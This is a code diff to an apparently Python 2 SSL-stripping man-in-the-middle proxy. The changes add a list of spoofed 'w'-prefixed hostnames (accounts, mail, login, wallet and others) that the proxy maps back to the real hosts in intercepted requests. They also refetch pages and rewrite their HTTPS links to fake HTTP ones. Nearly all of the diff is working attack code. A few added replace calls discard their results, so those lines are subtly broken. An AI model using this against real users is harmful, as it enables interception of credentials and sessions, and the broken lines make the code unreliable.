@@ -62,15 +62,30 @@ class SSLStripRequestHandler(ProxyRequestHandler):
     replaced_urls = deque(maxlen=1024)
     def request_handler(self, req, req_body):
 	print "\n-----------------------------[Request]--------------------------------"
-        if req.path in self.replaced_urls:
-            	req.path = req.path.replace('http://', 'https://w')
 	if req.headers:
 		modified = False
 		print "[+] Original Headers:"
 		print req.headers
+		prefixes = ["wwww","waccounts","wmail","wbooks","wssl","wdrive","wmaps","wnews","wplay","wplus","wencrypted","wassets","wgraph","wfonts","wlogin","wsecure","wwiki","wwallet","wmyaccount","wphotos","wdocs","wlh3","wapis"]
+		for p in prefixes:
+			for h in req.headers:
+				if p in req.headers[h]:
+					req.headers[h] = req.headers[h].replace(p, p[1:])
+					modified = True
+		if modified:
+			print "[+] Modified Headers:"
+			print req.headers
 	if req_body:
+		modified = False
 		print "\n[+]Original Body:"
 		print req_body
+		for p in prefixes:
+			if p in req_body:
+				req_body.replace(p, p[1:])
+				modified = True
+		if modified:
+			print "[+] Modified Body:"
+			print req_body
 
     def response_handler(self, req, req_body, res, res_body, scheme, netloc, path, method):
 	print "\n----------------------------[Response]--------------------------------"
@@ -103,16 +118,22 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 	if res_body:
 		print "\n[+] Original Body:"
 		print res_body
-		try:
-			if method == "POST":
-				fake_body = urllib2.urlopen("{}://{}{}".format(scheme, netloc, path), data=req_body).read()
-				res_body = fake_body.replace("https://", "http://w")
-			else:
-				fake_body = urllib2.urlopen("{}://{}{}".format(scheme, netloc, path)).read()
-				res_body = fake_body.replace("https://","http://w")
-		except Exception as e:
-			print "Exception caught: {}".format(e)
-			res_body = res_body.replace("https://","http://w")
+		if "302 Moved" in res_body:
+			res_body.replace("https://","http://w")
+		else:
+			try:
+				if method == "POST":
+					fake_body = urllib2.urlopen("{}://{}{}".format(scheme, netloc, path), data=req_body).read()
+					res_body = fake_body.replace("https://", "http://w")
+				else:
+					hds = {}
+					hds['User-Agent'] = req.headers['User-Agent']
+					original_request = urllib2.Request("{}://{}{}".format(scheme, netloc, path),headers=hds)
+					original_body = urllib2.urlopen(original_request).read()
+					res_body = original_body.replace("https://","http://w")
+			except Exception as e:
+				print "Exception caught: {}".format(e)
+				res_body = res_body.replace("https://","http://w")
 		print "\n[+] Modified Body:"
 		print res_body.replace("https://","http://w")
 		return res_body
